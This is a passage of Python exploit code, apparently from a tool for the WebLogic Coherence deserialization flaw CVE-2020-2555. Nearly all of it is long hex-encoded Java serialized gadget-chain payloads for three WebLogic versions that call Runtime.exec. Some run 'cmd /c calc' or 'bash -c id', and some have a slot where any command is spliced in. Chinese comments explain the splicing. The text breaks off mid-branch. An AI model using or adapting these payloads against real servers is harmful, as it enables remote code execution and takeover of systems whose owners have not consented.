        ser_12_2_1_4_cmd_c_calc_for = "aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000017372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000005174001a636f6d2e737570657265616d2e4356455f323032305f323535357400124356455f323032305f323535352e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e00157873720024636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e4c696d697446696c746572954e4590be89865f02000649000b6d5f635061676553697a654900076d5f6e506167654c000c6d5f636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b4c00086d5f66696c74657274001a4c636f6d2f74616e676f736f6c2f7574696c2f46696c7465723b4c000f6d5f6f416e63686f72426f74746f6d71007e00014c000c6d5f6f416e63686f72546f7071007e000178720034636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e416273747261637451756572795265636f7264657246696c746572f3b98201f680eb90020000787000000000000000007372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72435b250b72f63db502000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f729b1be18ed70100e50200014900096d5f6e546172676574787000000000757200325b4c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f723bdd8b89aed70273ca0200007870000000037372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f721f62f564b951b6140200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f6471007e00057871007e001e00000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647371007e0022000000007571007e002500000002707571007e002500000000740006696e766f6b657371007e0022000000007571007e002500000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000374"                                                       + "0003" + "636d64"  + "74" + "0002" + "2f63" + "74" + "{0}" + "74" + "0004" + "657865637070767200116a6176612e6c616e672e52756e74696d6500000000000000000000007870"
        # 12.2.1.4 bash -c id
        ser_12_2_1_4_bash_c_id  = "aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000017372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000005174001a636f6d2e737570657265616d2e4356455f323032305f323535357400124356455f323032305f323535352e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e00157873720024636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e4c696d697446696c746572954e4590be89865f02000649000b6d5f635061676553697a654900076d5f6e506167654c000c6d5f636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b4c00086d5f66696c74657274001a4c636f6d2f74616e676f736f6c2f7574696c2f46696c7465723b4c000f6d5f6f416e63686f72426f74746f6d71007e00014c000c6d5f6f416e63686f72546f7071007e000178720034636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e416273747261637451756572795265636f7264657246696c746572f3b98201f680eb90020000787000000000000000007372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72435b250b72f63db502000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f729b1be18ed70100e50200014900096d5f6e546172676574787000000000757200325b4c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f723bdd8b89aed70273ca0200007870000000037372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f721f62f564b951b6140200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f6471007e00057871007e001e00000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647371007e0022000000007571007e002500000002707571007e002500000000740006696e766f6b657371007e0022000000007571007e002500000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000374"                                                       + "0004" + "62617368"+ "74" + "0002" + "2d63" + "74" + "0002" + "6964"  +   "74" + "0004" + "657865637070767200116a6176612e6c616e672e52756e74696d6500000000000000000000007870"


        # 12.2.1.3 cmd /c calc
        #ser_12_2_1_3_cmd_c_calc = "aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000017372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000005174001a636f6d2e737570657265616d2e4356455f323032305f323535357400124356455f323032305f323535352e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e00157873720024636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e4c696d697446696c746572ab2901b976c4e27102000649000b6d5f635061676553697a654900076d5f6e506167654c000c6d5f636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b4c00086d5f66696c74657274001a4c636f6d2f74616e676f736f6c2f7574696c2f46696c7465723b4c000f6d5f6f416e63686f72426f74746f6d71007e00014c000c6d5f6f416e63686f72546f7071007e000178720034636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e416273747261637451756572795265636f7264657246696c746572f3b98201f680eb90020000787000000000000000007372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f7206ee10433a4cc4b402000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72752289ad4d4601380200014900096d5f6e546172676574787000000000757200325b4c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f723bdd8b89aed70273ca0200007870000000037372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f7287973791b26429dd0200035b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00116d5f657874726163746f7243616368656471007e00014c00096d5f734d6574686f6471007e00057871007e001e00000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000000707400096765744d6574686f647371007e0022000000007571007e002500000002707571007e00250000000070740006696e766f6b657371007e0022000000007571007e002500000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000374" + "0003" + "636d64"  + "74" + "0002" + "2f63" + "74" + "0004" + "63616c63" + "70" + "74" + "0004" + "657865637070767200116a6176612e6c616e672e52756e74696d6500000000000000000000007870"
        ser_12_2_1_3_cmd_c_calc_for = "aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000017372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000005174001a636f6d2e737570657265616d2e4356455f323032305f323535357400124356455f323032305f323535352e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e00157873720024636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e4c696d697446696c746572ab2901b976c4e27102000649000b6d5f635061676553697a654900076d5f6e506167654c000c6d5f636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b4c00086d5f66696c74657274001a4c636f6d2f74616e676f736f6c2f7574696c2f46696c7465723b4c000f6d5f6f416e63686f72426f74746f6d71007e00014c000c6d5f6f416e63686f72546f7071007e000178720034636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e416273747261637451756572795265636f7264657246696c746572f3b98201f680eb90020000787000000000000000007372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f7206ee10433a4cc4b402000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72752289ad4d4601380200014900096d5f6e546172676574787000000000757200325b4c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f723bdd8b89aed70273ca0200007870000000037372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f7287973791b26429dd0200035b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00116d5f657874726163746f7243616368656471007e00014c00096d5f734d6574686f6471007e00057871007e001e00000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000000707400096765744d6574686f647371007e0022000000007571007e002500000002707571007e00250000000070740006696e766f6b657371007e0022000000007571007e002500000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000374" + "0003" + "636d64"  + "74" + "0002" + "2f63" + "74" + "{0}" + "70" + "74" + "0004" + "657865637070767200116a6176612e6c616e672e52756e74696d6500000000000000000000007870"

        # 12.2.1.3 bash -c id
        ser_12_2_1_3_bash_c_id  = "aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000017372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000005174001a636f6d2e737570657265616d2e4356455f323032305f323535357400124356455f323032305f323535352e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e00157873720024636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e4c696d697446696c746572ab2901b976c4e27102000649000b6d5f635061676553697a654900076d5f6e506167654c000c6d5f636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b4c00086d5f66696c74657274001a4c636f6d2f74616e676f736f6c2f7574696c2f46696c7465723b4c000f6d5f6f416e63686f72426f74746f6d71007e00014c000c6d5f6f416e63686f72546f7071007e000178720034636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e416273747261637451756572795265636f7264657246696c746572f3b98201f680eb90020000787000000000000000007372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f7206ee10433a4cc4b402000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72752289ad4d4601380200014900096d5f6e546172676574787000000000757200325b4c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f723bdd8b89aed70273ca0200007870000000037372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f7287973791b26429dd0200035b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00116d5f657874726163746f7243616368656471007e00014c00096d5f734d6574686f6471007e00057871007e001e00000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000000707400096765744d6574686f647371007e0022000000007571007e002500000002707571007e00250000000070740006696e766f6b657371007e0022000000007571007e002500000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000374" + "0004" + "62617368"+ "74" + "0002" + "2d63" + "74" + "0002" + "6964"     + "70" + "74" +"0004657865637070767200116a6176612e6c616e672e52756e74696d6500000000000000000000007870"


        # 12.1.3.0 cmd /c calc(长度为4，命令文本为calc)
        #ser_12_1_3_0_cmd_c_calc = "aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000017372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000005174001a636f6d2e737570657265616d2e4356455f323032305f323535357400124356455f323032305f323535352e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e00157873720024636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e4c696d697446696c74657299022596d7b4595302000649000b6d5f635061676553697a654900076d5f6e506167654c000c6d5f636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b4c00086d5f66696c74657274001a4c636f6d2f74616e676f736f6c2f7574696c2f46696c7465723b4c000f6d5f6f416e63686f72426f74746f6d71007e00014c000c6d5f6f416e63686f72546f7071007e0001787000000000000000007372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72889f81b0945d5b7f02000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72658195303e7238210200014900096d5f6e546172676574787000000000757200325b4c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f723bdd8b89aed70273ca0200007870000000037372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f72ee7ae995c02fb4a20200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f6471007e00057871007e001d00000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647371007e0021000000007571007e002400000002707571007e002400000000740006696e766f6b657371007e0021000000007571007e002400000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000374" + "0003" + "636d64" + "74" + "0002" + "2f63" + "74" + "000463616c63" + "74" + "0004" + "657865637070767200116a6176612e6c616e672e52756e74696d6500000000000000000000007870"
        ser_12_1_3_0_cmd_c_calc_for = "aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000017372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000005174001a636f6d2e737570657265616d2e4356455f323032305f323535357400124356455f323032305f323535352e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e00157873720024636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e4c696d697446696c74657299022596d7b4595302000649000b6d5f635061676553697a654900076d5f6e506167654c000c6d5f636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b4c00086d5f66696c74657274001a4c636f6d2f74616e676f736f6c2f7574696c2f46696c7465723b4c000f6d5f6f416e63686f72426f74746f6d71007e00014c000c6d5f6f416e63686f72546f7071007e0001787000000000000000007372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72889f81b0945d5b7f02000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72658195303e7238210200014900096d5f6e546172676574787000000000757200325b4c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f723bdd8b89aed70273ca0200007870000000037372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f72ee7ae995c02fb4a20200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f6471007e00057871007e001d00000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647371007e0021000000007571007e002400000002707571007e002400000000740006696e766f6b657371007e0021000000007571007e002400000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000374" + "0003" + "636d64" + "74" + "0002" + "2f63" + "74" + "{0}" + "74" + "0004" + "657865637070767200116a6176612e6c616e672e52756e74696d6500000000000000000000007870"

        # 12.1.3.0 bash -c id(长度为2，命令文本为id)
        ser_12_1_3_0_bash_c_id  = "aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000017372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000005174001a636f6d2e737570657265616d2e4356455f323032305f323535357400124356455f323032305f323535352e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e00157873720024636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e4c696d697446696c74657299022596d7b4595302000649000b6d5f635061676553697a654900076d5f6e506167654c000c6d5f636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b4c00086d5f66696c74657274001a4c636f6d2f74616e676f736f6c2f7574696c2f46696c7465723b4c000f6d5f6f416e63686f72426f74746f6d71007e00014c000c6d5f6f416e63686f72546f7071007e0001787000000000000000007372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72889f81b0945d5b7f02000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72658195303e7238210200014900096d5f6e546172676574787000000000757200325b4c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f723bdd8b89aed70273ca0200007870000000037372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f72ee7ae995c02fb4a20200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f6471007e00057871007e001d00000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647371007e0021000000007571007e002400000002707571007e002400000000740006696e766f6b657371007e0021000000007571007e002400000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000374" + "0004" + "62617368"+"74" + "0002" + "2d63" + "74" + "0002" + "6964" + "74" + "0004" + "657865637070767200116a6176612e6c616e672e52756e74696d6500000000000000000000007870"


        # 命令的长度 + 命令字符串，例如长度为4的windows命令calc：0004 63616C63，和长度为2的linux命令id：0002 6964
        cmd_with_lenth = struct.pack('>H', len(p_cmd)).hex() + p_cmd.encode().hex()

        # 替换硬编码的命令（calc、 id），原理参考：https://xz.aliyun.com/t/7387#toc-7
        if p_version == '12.2.1.4.0':
            #ser_12_2_1_4_win_custom = self.replace_payload(ser_12_2_1_4_cmd_c_calc, cmd_with_lenth, True)
            ser_12_2_1_4_win_custom = ser_12_2_1_4_cmd_c_calc_for.format(cmd_with_lenth)
            ser_12_2_1_4_lin_custom = self.replace_payload(ser_12_2_1_4_bash_c_id, cmd_with_lenth, False)
            
            return [ser_12_2_1_4_win_custom, ser_12_2_1_4_lin_custom]
        elif p_version == '12.2.1.3.0':
